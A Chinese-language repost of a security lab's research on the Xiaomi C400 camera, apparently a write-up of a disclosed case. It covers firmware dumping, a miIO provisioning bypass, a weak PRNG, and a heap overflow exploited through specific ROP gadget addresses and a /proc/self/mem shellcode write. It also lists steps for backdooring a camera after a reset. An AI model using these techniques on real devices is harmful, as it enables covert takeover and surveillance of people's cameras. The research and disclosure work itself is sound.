#  实战 IoT 漏洞挖掘—小米 C400 摄像头  
林00
                    林00  SecureNexusLab   2026-03-18 01:25  
  
> ❝  
> 这是一篇来自 TASZK Security Labs 的技术干货，文章记录了研究人员如何从零开始，对小米 C400 智能摄像头进行逆向工程，并最终发现三个严重漏洞的全过程。  
> 「完整的攻防视角」：从物理拆解、串口探测、固件转储，到协议逆向、漏洞挖掘、利用编写，覆盖物联网安全研究的全链路「三个 0-day 漏洞揭秘」：认证绕过、弱随机数、堆溢出——每一个都直击设备核心「“云端越狱”」：让摄像头彻底摆脱小米云，实现完全自主运行  
> ❞  
  
  
**「TASZK Security Labs」**  
  
去年夏天，TASZK Security Labs 开展了一项针对小米安防摄像头的安全研究项目，目标型号为小米 C400 智能摄像头——这是市场上非常流行的一款设备。  
  
项目设定两个最终目标：  
- 通过任意无线/局域网接口实现远程代码执行（RCE）漏洞利用  
  
- 利用该漏洞实现完整的"云端越狱"  
  
后者的动机在于，这些设备的正常运行高度依赖小米智能手机应用和小米云服务器，因此，目标是实现一种配置：摄像头完全独立运行，不再依赖任何小米服务。  
  
考虑到时间限制，这个项目更像是现实中的 CTF 竞赛，而非全面的安全审计。  
  
最终，在小米专有设备配网协议的实现中发现了 3 个严重漏洞，并成功利用它们构建了 RCE 漏洞利用程序和越狱方案。  
## 第一章：逆向工程入门  
  
对物联网设备进行逆向工程，第一步是获取其软件并进行拆解，提取可执行二进制文件、配置文件等。  
  
**「操作要点：」**  
- **「固件获取途径」**  
：从制造商服务器下载 OTA 更新文件，或直接转储闪存芯片  
  
- **「硬件接口」**  
：寻找 UART、JTAG 等调试接口，通常隐藏在 PCB 的测试焊盘上  
  
- **「引导加载程序」**  
：检查 U-Boot 是否编译时启用了交互式 shell  
  
设备上运行的固件可能来自不同来源，最容易获取的是从制造商服务器下载更新文件（OTA）。此外，可以通过将实际设备的闪存芯片连接到闪存读取器硬件来直接转储。根据引导加载程序的加固程度，U-Boot 可能编译时启用了交互式 shell，这使得转储存储介质变得更加容易。  
  
拿到系统分区的转储后，静态分析部分的逆向工程工作就可以开始了。  
  
大多数时候静态分析不够，需要在真实硬件上运行设备时与之交互。为了重写配置或管理运行中的服务，shell 访问至关重要。安防摄像头作为嵌入式设备，通常配备串口主要用于打印应用日志。然而，有些串口也会提供登录 shell。也可能存在 Telnet 和 SSH 访问，可能隐藏在调试标志后面。  
  
当系统范围的逆向工程聚焦到单个可能存在漏洞的二进制文件时，就需要更高级的调试功能。这可以是静态编译的 gdb 服务器部署到安防摄像头上，通过网络访问。  
## 第二章：小米 C400 硬件拆解与调试  
  
这款摄像头的第一个挑战是物理拆解设备：球型部分有非常紧的卡扣固定两个部件。  
  
**「硬件调试步骤：」**  
1. **「寻找 UART」**  
：在 PCB 上找到 SigmaStar ARMv7 SoC 周围的测试焊盘  
  
1. **「引脚识别」**  
：启动时用万用表测量，寻找 3.3V 信号  
  
1. **「确认波特率」**  
：连接逻辑分析仪，识别出 115200  
  
1. **「试错找 RX」**  
：在同一组引脚中通过试错找到 UART-RX  
  
在 PCB 上，SigmaStar ARMv7 SoC 周围有一些可见的测试焊盘。通过在摄像头启动时用万用表测量它们，其中一个看起来像是 3.3V 信号，将该引脚连接到逻辑分析仪后，能够确认它确实是 UART-TX 引脚，波特率为 115200，然后通过试错找到了同一组引脚中的 UART-RX 引脚，UART 引脚连接到 FTDI USB 串口适配器，尽管接收到大量日志消息，但设备似乎忽略来自 RX 的任何输入，因此没有获得登录 shell。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PkfClzhSYicwO8D8JibHRx5XdX3nevMeiaLbwq1epicXMSPOTNO9ibSXTibnqrnvqehRtvspRFEFWP8RzmagDicoaAth3AZlwpkFwevuPuwCXWlUhM/640?wx_fmt=png&from=appmsg "")  
  
**「固件转储：」**  
为了获取设备上实际运行的软件，使用 SOIC-8 夹具连接到闪存适配器，配合 flashrom 工具转储了闪存。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PkfClzhSYicwCEFkLg5ahOGjbYN3TT8bwDz68t3c8JtEV7KGrg8wAmSiaUep17TGhL2HzIHicad6sUJ8xV78AsT1IFNwh6N15ictqUeBgbjDG6M/640?wx_fmt=png&from=appmsg "")  
  
**「获得 root shell：」**  
在 u-boot 环境变量分区中找到 Linux 内核的 cmdline。通过劫持 Linux 初始化阶段——将 init=/linuxrc 替换为 init=/bin/sh，修正 UBOOT-ENV 分区的 CRC，并将其外部写入闪存——终于在串口上获得了 shell。  
## 第三章：OTA 固件与系统分析  
  
对于小米设备，获取 OTA 更新比较麻烦，因为没有支持页面提供可下载的固件文件或固件文件的公开列表，小米设备向小米更新服务器查询更新，然后获得下一个可用的 OTA 更新包。  
  
然而，URL 中有一些模式，包含固件版本号，所以，虽然没有设备的完整变更日志，但这仍然可能允许暴力破解版本号。  
  
如上已经获得了 root shell，因此在逆向工程工作中不受限于 OTA 固件镜像。  
## 第四章：系统分区与关键进程  
  
进一步分析系统分区会发现多个 squashfs 和 JFFS2 分区，USRFS 上包含有趣的服务二进制文件。  
  
获得 shell 后，发现处于一个标准的、基于 Buildroot 的嵌入式 Linux 系统中，使用 busybox+uClibc 用户空间。检查运行中的进程，看到：  
- **「hostapd」**  
：创建一个开放的 Wi-Fi 网络  
  
- **「imi_mike」**  
、**「miio_client」**  
、**「mi_daemon」**  
：这三个进程包含摄像头的实际逻辑  
  
- imi_mike 负责与硬件接口  
  
- miio_client 是开放 UDP 端口的进程。除了 DHCP 服务器外，这是设备上唯一可网络访问的端口  
  
- mi_daemon 加载配置并监督前两个进程，在它们崩溃时重新启动  
  
这三个进程通过 Unix 套接字和 TCP 环回发送 JSON 进行通信。  
  
作为唯一直接暴露在网络中的组件，miio_client 是明显的攻击面。购买这款设备时，使用智能手机应用进行设置——这就是与摄像头通信的程序。  
  
可执行文件的静态分析很直接，它们是普通的 Linux ARM 用户空间二进制文件，而在目标上进行动态调试更具挑战性。  
## 第五章：miIO 协议逆向  
  
小米使用自己的消息协议，通过 UDP 端口 54321，称为 miIO。用户首先发送 hello 数据包：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PkfClzhSYicxGXcHVED7tWV5TfakB7cI7dL3IcbCFlTUIy2gPj4rSaGX27WxolZGpIceJcvBzicXKzS3vamE63zSRCHbFjIN4QHjicfoCWMnVI/640?wx_fmt=png&from=appmsg "")  
  
设备在"出厂模式"（尚未设置）下回复：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PkfClzhSYiczEVvC2uCUh5dcJ9qWiaibzf480sAyR95EZm9bau8RqdspBias3MkMD4bsUg5nKJRiaoXqLePQdM4SWZrjDf9DibfWE04G6H5CNEQS4/640?wx_fmt=png&from=appmsg "")  
  
手机知道了设备 ID、服务器时间戳和 token，可以发送如下所示的数据包：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PkfClzhSYicwDic9vblUUAnLuMJ5PkiaZAkeibP45BksnapgRX3ibNaAibnmJwwj8ITpWgVlOBVGMGdvdDfg1YibCTDl0yl8OXNwLDcHL67oOCm7wo/640?wx_fmt=png&from=appmsg "")  
## 第六章：配网流程解析  
  
当摄像头首次从包装盒中取出时，它处于特殊的"出厂"状态。按住摄像头背面的按钮 10 秒钟也可以随时进入此状态，进行恢复出厂设置。  
  
在出厂状态下，摄像头会托管自己的 Wi-Fi 接入点，无需认证，手机可以连接到此接入点，并使用小米家庭应用设置设备。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PkfClzhSYicxicUXu2Hbjulm5tjAFQJghNOJYoDKUBib1IxRMria4g1Y8lmBZsJdyP4qWibf9P9a6yugDCV8YaRhLibxfncFwQEC2lp8MneBib0874/640?wx_fmt=png "")  
  
设置需要手机使用 miIO 协议向摄像头发送特定的"握手"数据包序列，摄像头对握手消息（R0）的响应包含一个十六进制编码的 token，这个 token 成为后续密钥生成步骤中的盐值（K = HKDF(ECDH(s2,p1),salt)），如前面描述数据包格式的部分所示。  
  
一旦序列成功完成，包括最终的 HMAC 验证步骤，所有后续消息将包含 MAC（而不是 ff 或 token），并加密实际负载，如前所示。  
  
默认情况下，完成序列需要一个随机的、设备特定的设置码，用户通过使用小米家庭应用扫描设备底部的二维码获得，因此需要物理访问。替代选项是允许设备随机生成一次性代码，它通过扬声器播报出来。  
  
握手序列不仅认证手机对摄像头的物理访问，还允许手机验证摄像头是否知道设置代码，而无需任何一方泄露代码本身。这防止了攻击者冒充摄像头欺骗应用或泄露代码。椭圆曲线 Diffie-Hellman 密钥交换也使得中间人攻击变得毫无意义。  
## 第七章：攻击面分析  
  
从上述描述可以看出，miIO 协议设计从密码学角度来看似乎是合理的，配网序列考虑了中间人场景，所有后续设置后消息都使用共享密钥保护，通过对数据包字段使用 MAC 来防止哈希扩展攻击。这发生在任何其他额外认证可能进一步缩小攻击面之前。  
  
然而，设计者不仅在密码学实现中犯了错误，使得配网序列本身可被绕过，甚至在（初始）数据包处理代码中留下了内存损坏漏洞，允许攻击者通过 WiFi/LAN 实现完整的远程代码执行。  
> ❝  
> **「重点提示」**  
> 接下来的三个漏洞是整个研究的核心。它们层层递进：  
> 「漏洞 #1」 打破了物理接触的限制「漏洞 #2」 让加密通信形同虚设「漏洞 #3」 最终实现代码执行  
> 三个漏洞组合使用，可以完整接管设备。  
> **「复现所需环境：」**  
> 一台小米 C400 智能摄像头（固件版本需在 2025 年 9 月之前）Linux 主机（用于运行 PoC 代码）无线网卡（支持监听模式）Python 3 + 必要的密码学库  
> ❞  
  
## 第八章：漏洞 #1 复现——小米 miIO 协议认证绕过  
  
握手序列设计存在缺陷，可以通过重放摄像头发送的某些值来完成配网流程，而无需知道设置码。这消除了配网所需的物理访问必要性。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PkfClzhSYicyaAG8SOcu7sB5RzpuKmz7yAibraAJtLg96dLRgEGf1kibaf2KNTrZfXgRI4xCfhgJ5HVwBPfOnFaialL15pjIrj2rZrfOZiaialbkk/640?wx_fmt=png "")  
  
**「复现步骤：」**  
1. 将摄像头恢复出厂设置，进入 AP 模式  
  
1. 连接摄像头的开放 Wi-Fi  
  
1. 捕获握手序列中的特定数据包  
  
1. 重放这些数据包完成配网  
  
## 第九章：漏洞 #2 复现——弱伪随机数生成器  
  
对于握手序列中的密钥对和随机前缀生成，摄像头使用了 uClibc 库的默认加法滞后斐波那契生成器，这不适合用于加密目的。  
  
平均发送 22 个数据包后，所有未来随机数都可以被可靠预测，这使得设置中使用的密码学原语的要求失效。  
  
**「复现步骤：」**  
1. 向摄像头发送连续的 hello 数据包  
  
1. 记录每次响应的 token 和时间戳  
  
1. 分析随机数序列，建立预测模型  
  
1. 验证预测的准确性  
  
为了生成足够的反射随机性，可以简单地重启握手序列，摄像头会继续发送新的 R0 响应给初始 hello，生成新的随机数。  
  
一般来说，PRNG 可以被轻易破解从来都不是好兆头，需要看到具体的含义。  
  
首先，给定基于二维码的代码长度（128 位），为了尝试暴力破解而破坏 PRNG 并没有太大价值。此外，即使等待序列，总是在得到 H2 之前得到 R2，所以如果尝试暴力破解（考虑到对计算资源现实的了解，这仍然是徒劳的练习），不需要预测任何东西就能拥有"除了"代码之外的每个输入。  
  
另一方面，在使用随机生成代码的场景中，该代码只有 4 位数字，所以即使没有离线暴力破解，其熵也是微不足道的。当然，鉴于实现设计允许具有物理访问权限的人强制重置并强制摄像头说出代码，RNG 设计缺陷感觉也不是关键问题。  
  
然而，还有第三种场景实际上使 RNG 问题变得有意义。从序列中看到，一旦攻击者能够破坏 RNG，没有什么能阻止它精确计算进一步生成的 K 值（鉴于 s2、p2、salt 都将变得可预测），即使它不再是实际冒充小米家庭应用的参与方。  
  
换句话说，攻击者可以先执行 RNG 破坏，"离开"，允许真正的所有者自己重新进行正确的设置，然后继续窃听 miIO 接口上的所有通信，其中包括推送到设备的明文 WiFi 凭据。  
  
本质上，RNG 漏洞直接破坏了任何 802.11 级别的安全性，并提供了方便的直接局域网访问——当然，还有任何潜在的下一阶段攻击。  
## 第十章：漏洞 #3 复现——堆缓冲区溢出  
  
小米 miIO 协议的数据包包含头部、基于 MD5 的消息认证码（MAC）和 AES-128-CBC 加密负载。负载在加密前填充到 16 字节的倍数。MAC 在加密后计算。  
  
验证 MAC 后，miio_client 二进制文件解密在 UDP 端口 54321 上接收的数据包。AES 解密函数包含专门处理负载大小不能被 16 整除的情况的代码，而不是拒绝这些数据包，这种情况通常不会达到，因为数据包负载被正确填充。  
```
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line
// AesCurrentBlock、AesKey 和 AesIv 是全局指针
void AesCbcDecrypt(
    const byte *ciphertext, uint size,
    byte *plaintext, byte *key, byte *iv
) {
    byte *dst;
    const byte *src;
    uint remainder_bytes = size & 0xf;
    // copy16 将 16 字节从第二个参数复制到第一个
    copy16(plaintext, ciphertext);
    AesCurrentBlock = plaintext;
    if (key != 0x0) {
        AesKey = key;
        AesKeyExpansion();
    }
    if (iv != 0x0) {
        AesIv = iv;
    }
    uint offset = 0;
    while (true) {
        src = ciphertext + offset;
        dst = plaintext + offset;
        // 如果 remainder_bytes != 0，可能没有一个完整的块剩余
        if (size <= offset) break;
        offset = offset + 0x10;
        copy16(dst, src);
        AesCurrentBlock = dst;
        AesBlockDecrypt();
        XorWithIv(dst);
        AesIv = src;
    }
    if (remainder_bytes != 0) {  // 在有效（填充）数据包上永远不会发生
        copy16(dst, src);
        memset(dst + remainder_bytes, 0, 0x10 - remainder_bytes);
        AesCurrentBlock = dst;
        AesBlockDecrypt();
    }
}
```  
  
部分块的大小保存为 remainder_bytes，但 size 没有减去这个量。这导致最后一个块（在 if 条件中）从输入缓冲区外部读取密文，并将解密的明文写入位于堆上的输出缓冲区外部。  
  
由于程序使用 miIO 协议头部中指定的数据包长度，攻击者可以通过发送比此长度大的 UDP 数据包来控制输入缓冲区后的字节，从而控制写入明文堆缓冲区边界外的 16 字节。  
  
通过结合利用漏洞 [#1]()  
 和 [#3]()  
 可以实现远程代码执行。  
## 第十一章：受控溢出技术详解  
  
协议有数据包长度字段，而不是使用设备接收的 UDP 数据包大小。如果发送的数据包比长度字段指示的大，那么也控制输入缓冲区后的字节。  
  
**「溢出构造方法：」**  
- 数据包长度设为 16 的倍数减 1  
  
- AesCbcDecrypt 函数只将溢出块的最后一个字节设置为 0  
  
- 可以控制作为 AES 解密输入的 16 字节中的 15 个  
  
此外，如果确保数据包长度只比 16 的倍数少 1，那么 AesCbcDecrypt 函数只将溢出块的最后一个字节设置为 0，意味着控制作为 AES 解密输入的 16 字节中的 15 个。  
  
由于输出缓冲区在堆上，可以使用此溢出来破坏下一个块。二进制文件使用 uClibc 的 malloc 标准分配器，它以如下方式存储块：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PkfClzhSYicwxMwUQkO7S3TPzmGz0ibGZfMmxpL67oZNu6kcm1OT4DibgANocKiaiaDnh3BFeK8oBzJGVtbOLBnaIFO4ODib6icZgGETw9Ia2URnzU/640?wx_fmt=png&from=appmsg "")  
  
由于有 16 字节的溢出，可以完全覆盖下一个块的元数据，无法完全控制解密输入这一事实也可以解决：  
  
在前一个块正在使用（未释放）时 prev_size 字段被忽略，可以按需要设置其他 3 个元数据字段，并为 prev_size 字段尝试许多可能的值，直到发现密文自然以空字节结尾。prev_size 字段有 2^32 个可能值，每 256 个密文中有一个以空字节结尾。  
  
分配器有两种"箱"类型用于存储已释放的块：双向链表（未排序箱、小箱、大箱）使用前向和后向指针，以及单向链表（快箱），仅使用前向指针。  
  
破坏双向链表并在任意地址添加块会因以下检查使程序中止：  
```
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line
/* 从箱列表中取出块 */
#define unlink(P, BK, FD) {\
    FD = P->fd;\
    BK = P->bk;\
    if (FD->bk != P || BK->fd != P)\
        abort();\
    FD->bk = BK;\
    BK->fd = FD;\
}
```  
  
因此，破坏快箱中的块更有用，可以覆盖链表的前向指针。这意味着可以向快箱列表添加一个"假"块：分配器认为它是空闲的并可以在分配请求时给出，尽管它从未是已分配和释放的适当堆块。  
  
在能够溢出的块之后直接获得快箱中的块，可以通过遵循（但不完成）设备的正常配网流程来实现，其中包括使用静态链接的 mbedtls 库生成椭圆曲线密钥对。此操作会在快箱上留下相当多的块。  
  
在配网流程的最后数据包中故意插入无效签名，使设备保持初始状态，但在堆上留下许多块，准备发送触发堆溢出的数据包。  
## 第十二章：寻找可用的假块  
  
有一个复杂情况：解密数据包后，二进制文件开始解析其中包含的 JSON，导致大量分配：  
```
ounter(lineounter(lineounter(lineounter(line
int jsmi_parse_start(/*...*/) {
    jsmntok *tok_array = malloc(0x650);
    // ...
}
```  
  
如此大的分配会使 malloc() 调用 libc 内部的 __malloc_consolidate() 函数，将当前快箱中的所有块放入未排序箱，如果可能的话与前面/后面的块合并。  
  
假块需要满足三个条件才有用：  
1. 必须有合理的大小，意味着以后可以分配。如果大小太小（0-8 字节），永远无法分配它。如果大小太大，可能会被程序的其他部分（包括其他线程）使用，在使用之前填充它。  
  
1. 假块的前向指针必须为 0，否则分配器会跟随指针寻找下一个块，导致崩溃。  
  
1. 分配器必须认为前面和后面的块当前正在使用。否则，会尝试 unlink() 它们，导致崩溃或中止。  
  
虽然 Linux 内核启用了 ASLR，但 miio_client 二进制文件本身没有编译为位置无关代码。因此，如果找到属于二进制文件（而不是任何加载的共享库）的合适指针，可以确定它在每次运行时都相同。  
  
在内存中搜索符合上述标准的地址，可以发现以下字节：  
```
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line
0x000a347c │+0x0000: 0x00000000  <- 假块 prev_size
0x000a3480 │+0x0004: 0x0000006f  <- 假块大小 + prev_inuse 标志设置
0x000a3484 │+0x0008: 0x00000000  <- 假块前向指针
0x000a3488 │+0x000c: 0x00000000
0x000a348c │+0x0010: 0x00000000
0x000a3490 │+0x0014: 0x00000000
0x000a3494 │+0x0018: 0x000156ed -> miio_online_hook_default()
0x000a3498 │+0x001c: 0x000158cd -> miio_offline_hook_default()
0x000a349c │+0x0020: 0x00000000
0x000a34a0 │+0x0024: 0x00015869 -> miio_info_kvs_hook_default()
0x000a34a4 │+0x0028: 0x00015485 -> miio_ext_rpc_hook_default()
0x000a34a8 │+0x002c: 0x00015805 -> miio_restore_hook_default()
0x000a34ac │+0x0030: 0x000157a1 -> miio_reboot_hook_default()
0x000a34b0 │+0x0034: 0x00000000
0x000a34b4 │+0x0038: 0x00000000
0x000a34b8 │+0x003c: 0x00000000
0x000a34bc │+0x0040: 0x00000000
0x000a34c0 │+0x0044: 0x000806dc
0x000a34c4 │+0x0048: 0x00000003
0x000a34c8 │+0x004c: 0xffffffff
0x000a34cc │+0x0050: 0xffffffff
0x000a34d0 │+0x0054: 0xffffffff
0x000a34d4 │+0x0058: 0xffffffff
0x000a34d8 │+0x005c: 0xffffffff
0x000a34dc │+0x0060: 0xffffffff
0x000a34e0 │+0x0064: 0xffffffff
0x000a34e4 │+0x0068: 0xffffffff
0x000a34e8 │+0x006c: 0xffffffff
0x000a34ec │+0x0070: 0xffffffff
```  
  
由于 0x6f 的最低有效位已设置，分配器会认为前一个块正在使用。  
  
下一个块从 0x000a347c + 0x6e = 0x000a34ea 开始，大小字段在 0x000a34ee，该值为 0xffffffff，大小为 0xfffffffe（有符号 -2），第二个下一个块从 0x000a34e8 开始，大小字段在 0x000a34ec，该值为 0xffffffff 且最低有效位已设置，下一个块也在使用中。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PkfClzhSYicwgxRZFDusjAGTmDl7m0CXeatGuPOicUbG8gQezgeH481Wstfic678owzc1sPxzN1a4ial1TnZt89WCl8NGibzYlaO9XnUxC6mLfNc/640?wx_fmt=png "")  
## 第十三章：触发函数指针覆盖  
  
发送适当大小的数据包，使解密的负载落在这个假块中，覆盖它。需要覆盖两个值（可以用原始值覆盖其他值，最小程度地干扰程序）：  
- 0x000a34a0 处的函数指针，通常指向 miio_info_kvs_hook_default() 函数  
  
- 0x000a34bc 处的值  
  
之后，发送包含以下负载的数据包：  
```
ounter(line
{"id":1, "method":"miIO.info"}
```  
  
可以观察到 0x000a34a0 处被覆盖的函数指针被调用，0x000a34bc 设置的值作为寄存器 r3 的值。  
> ❝  
> **「重点提示」**  
> 接下来的利用过程涉及 ARM 架构下的 ROP 链构造。  
> 通过函数指针覆盖劫持控制流利用 gadget 拼接实现任意代码执行最终写入 shellcode 获得 root shell  
> **「复现所需工具：」**  
> ARM 版本的 ROPgadget 或 Ropper支持 ARM 架构的调试器（如 gdb-multiarch）自定义的 Python 漏洞利用脚本  
> ❞  
  
## 第十四章：扩展 gadget 链  
  
使用函数指针覆盖实现任意代码执行，需要找到以下形式的 gadget：  
```
ounter(line
ldr rA, [r3, #??]; ldr rB, [r3, #??]; bx rB
```  
  
从 r3（可控的）加载寄存器的值，并从 r3 加载另一个值来跳转。链接这样的 gadget 可以在保持控制的同时设置多个寄存器。  
  
这种形式的有用 gadget：  
```
ounter(lineounter(line
0x00041be0: ldr r0, [r3, #4]; ldr r2, [r3]; blx r2
0x000364a2: ldr r2, [r3, #0x2c]; ldr r1, [r3, #0x30]; blx r2
```  
  
使用这些，可以控制寄存器 r0 和 r1。需要将 r3 设置为指向可控数据的地址。使用空字节将一些额外数据附加到触发数据包：  
```
ounter(line
{"id":1,"method":"miIO.info"}\x00anything goes here
```  
  
uClibc 中的 malloc 实现使用 brk()，将堆放在内存中二进制文件之后。堆从已知地址开始，因为二进制文件加载在固定地址。  
  
如果数据包足够大（大于 1KB），分配器会可预测地将其放在堆的末尾，因为它无法放入其他块之间的任何空洞。程序在启动时总是执行相同的分配，假设当前没有其他大的分配处于活动状态，可以知道数据包将结束的地址。  
  
这是一个相当合理的假设，因为程序是单线程的，在正常操作期间不会泄漏内存，这意味着即使它之前收到过大的数据包，该数据包也会在处理时被释放，使新数据包位于堆的末尾。  
  
由于可以可靠地预测数据包被写入的位置，可以将 r3 设置为指向它。  
  
如果假设不正确，漏洞利用（使用不正确的地址）将导致进程崩溃，促使 mi_daemon 进程立即重新启动它。这留下一个全新的堆，其中只有确定性的启动分配发生，允许第二次成功运行漏洞利用。  
  
控制了 r0 和 r1，可以跳转到以下 gadget：  
```
ounter(lineounter(line
0x00071dd8: mov r7, r0; add r0, sp, #0x14; str r0, [sp]; ldr r4, [r1, #8]; ldr r0, [r1]; ldr r5, [sp, #0x50]; blx r4
0x0004f87c: mov sp, r7; pop.w {r4, r5, r6, r7, r8, sb, sl, fp, pc}
```  
  
第一个允许将 r0 中的值移动到 r7，并通过从 r1 加载保持控制。  
  
第二个将 r7 中的值移动到堆栈指针，允许将堆栈旋转到任何位置。再次选择数据包的额外数据部分，控制新堆栈的全部内容，带入 ROP 链。  
  
在 ARM 上，函数的返回地址存储在 lr 寄存器中而不是堆栈上，必须覆盖它以在调用后保持控制。两个 gadget 很有用：  
```
ounter(lineounter(line
0x0004bb18: pop {r0, r1, r2, r3, r5, pc};
0x00071052: pop.w {r4, lr}; bx r3
```  
  
使用这些，控制 r0、r1、r2 和 lr，可以调用任何最多三个参数的函数。  
## 第十五章：植入 shellcode  
  
接下来尝试调用二进制文件中的函数。虽然不知道 libc.so 的地址，因为 ASLR，但可以使用二进制文件的 PLT 来调用链接到的标准库函数。  
  
其中一个函数是 system()，可以用来在设备上执行任意命令。但没有方便的方式启动反向/绑定 shell，需要为每个命令再次执行漏洞利用。也没有简单的方法获取命令的输出。  
  
**「更优雅的解决方案：」**  
使用 /proc/self/mem  
 直接写入 shellcode  
  
或者，使用以下调用链：  
```
ounter(lineounter(lineounter(line
fd = open("/proc/self/mem", O_RDWR);
lseek(fd, 0x13000, SEEK_SET);
write(fd, shellcode_ptr, shellcode_length);
```  
  
0x13000 可以是任何可执行的任意地址。代替寻找 gadget 来保留 open() 返回的文件描述符，可以多次调用 open()，使其容易猜测对应于 /proc/self/mem 的文件描述符号。write() 调用有效是因为在 Linux 内核的默认配置中，/proc/self/mem 忽略写保护，允许更改可执行代码。  
  
将绑定 shell 的 shellcode 写入 0x13000 后，最后一步是跳转到它，完成漏洞利用。miio_client 进程以 root 身份运行且没有任何沙盒，完全控制设备。  
  
**「成功标志：」**  
获得设备的 root shell，可以执行任意命令  
## 第十六章：与漏洞 #1 组合利用  
  
摄像头在出厂状态下的接入点没有保护，当用户尝试设置摄像头时，Wi-Fi 范围内的攻击者可以使用漏洞 [#1]()  
（或 [#2]()  
）远程完成设置，无需物理访问或可见性，比用户更快。  
  
这可能导致攻击者能够查看摄像头画面。但这种攻击很可能被用户注意到，因为用户将无法执行已在使用中的设备的设置。  
  
当与漏洞 [#1]()  
 或 [#2]()  
 结合时，攻击者还可以完全接管设备，安装持久后门。这可以在用户不知情的情况下完成。  
  
对已经安装的设备也可以进行攻击，如果攻击者有短暂的物理访问。按住按钮 10 秒钟恢复出厂设置摄像头，然后使用漏洞 [#2]()  
 和漏洞 [#1]()  
，攻击者可以以相同方式安装后门。由于漏洞 [#2]()  
，攻击者不需要摄像头底部的二维码，因此攻击者不需要移动摄像头。遮盖或移除二维码是不够的防护。  
  
**「攻击场景复现：」**  
1. 物理接近目标摄像头（或在其 Wi-Fi 范围内）  
  
1. 等待用户重置摄像头，或主动触发重置  
  
1. 利用漏洞 [#1]()  
 或 [#2]()  
 完成配网  
  
1. 利用漏洞 [#3]()  
 植入持久后门  
  
1. 用户正常使用，但攻击者拥有完全控制权  
  
## 第十七章：云端越狱实现  
  
"云端越狱"的目标是修改摄像头运行时，使其不需要配置任何云连接即可运行。  
  
需要两样东西：替换通过云完成的功能 + 确保云不会干扰设备。  
### 实现步骤详解  
  
**「第 1 步：获得 root 访问权限」**  
使用前述漏洞组合获得设备的 root shell  
  
**「第 2 步：获得持久性」**  
找到一个在重启时执行且可以更改而无需刷写整个设备的操作系统脚本/二进制文件。/mnt/data/sysctl 就是这样一个候选。  
  
**「第 3 步：替换云功能」**  
要运行自定义代码，LD_PRELOAD 库有效（即使在 noexec 分区上），可以劫持供应商提供的二进制文件。目标是 imi_mike 二进制文件，它启动植入代码。  
  
越狱实现（一个约 600 行的可执行文件）本身调用小米也使用的库函数来移动摄像头和访问摄像头画面。此代码实现通过 TLS 将画面发送到服务器（使用 MPEG TS 格式），以及使用非对称加密将内容保存到 SD 卡的能力。还接受移动摄像头的命令。  
  
**「第 4 步：切断云干扰」**  
由于实现最小化的更改集，摄像头软件堆栈不会直接进一步修补以防止访问云。由于此时云不再对功能必要，首选设置可以简单地依赖定制的防火墙规则，确保不允许任何意外的互联网访问到摄像头。  
  
**「服务器端配置：」**  
- 简单方案：基于 ffplay 的命令行解决方案  
  
- 进阶方案：使用 frigate IP 摄像头 Web GUI  
  
## 第十八章：安装与使用  
  
GitHub 上发布的仓库中详细说明了重现此操作的所有必要步骤。**「评论“「使用」”获取步骤」**  
  
提醒⚠️：所有公布的漏洞利用代码仅供安全研究使用，请勿用于非法用途！如果您成功复现了本教程中的内容，建议在受控环境中进行，并及时更新设备固件。  
  
